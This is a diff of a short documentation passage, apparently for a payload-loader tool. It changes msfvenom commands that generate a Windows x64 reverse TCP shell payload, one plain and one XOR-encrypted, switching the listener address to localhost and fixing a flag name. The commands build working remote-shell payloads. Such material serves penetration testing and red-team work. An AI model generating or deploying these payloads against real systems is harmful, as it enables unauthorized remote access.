@@ -45,13 +45,13 @@
 Generate a reverse TCP shell (unencrypted):
 
 ```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.26.243.224 LPORT=4444 -f hex -o payload.hex
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f hex -o payload.hex
 ```
 
 Generate and XOR-encrypt in one step:
 
 ```bash
-msfvenom -p windows/x64/shell_reverse_tcp --encrypt xor --encryption-key hacker LHOST=172.26.243.224 LPORT=4444 -f hex -o payload_encrypted.hex
+msfvenom -p windows/x64/shell_reverse_tcp --encrypt xor --encrypt-key hacker LHOST=127.0.0.1 LPORT=4444 -f hex -o payload_enc.hex
 ```
 
 ---
